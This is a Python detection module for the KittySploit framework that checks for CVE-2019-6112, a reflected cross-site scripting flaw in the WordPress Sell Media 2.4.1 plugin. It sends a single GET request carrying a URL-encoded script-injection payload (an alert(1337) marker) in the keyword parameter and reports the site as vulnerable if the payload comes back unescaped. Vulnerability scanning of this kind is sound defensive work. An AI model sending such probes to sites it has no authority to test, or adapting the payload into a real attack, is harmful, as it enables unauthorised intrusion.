#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Plugin Sell Media v2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Sell Media 2.4.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Plugin Sell Media v2.4.1 contains a cross-site scripting vulnerability in /inc/class-search.php that allows remote attackers to inject arbitrary web script or HTML via the keyword parameter (aka $search_term or the Search field).',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'wordpress', 'wp-plugin', 'xss', 'graphpaperpress', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/graphpaperpress/Sell-Media/commit/8ac8cebf332e0885863d0a25e16b4b180abedc47#diff-f16fea0a0c8cc36031ec339d02a4fb3b',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-6112',
            'https://metamorfosec.com/Files/Advisories/METS-2020-001-A_XSS_Vulnerability_in_Sell_Media_Plugin_v2.4.1_for_WordPress.txt',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2019-6112',
    }

    def run(self):
        r = self.http_request(method="GET", path='/sell-media-search/?keyword=%22%3E%3Cscript%3Ealert%281337%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('id="sell-media-search-text" class="sell-media-search-text"', 'alert(1337)',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="WordPress Sell Media 2.4.1 - Cross-Site Scripting detected",
                path='/sell-media-search/?keyword=%22%3E%3Cscript%3Ealert%281337%29%3C%2Fscript%3E',
            )
            return True
        return False

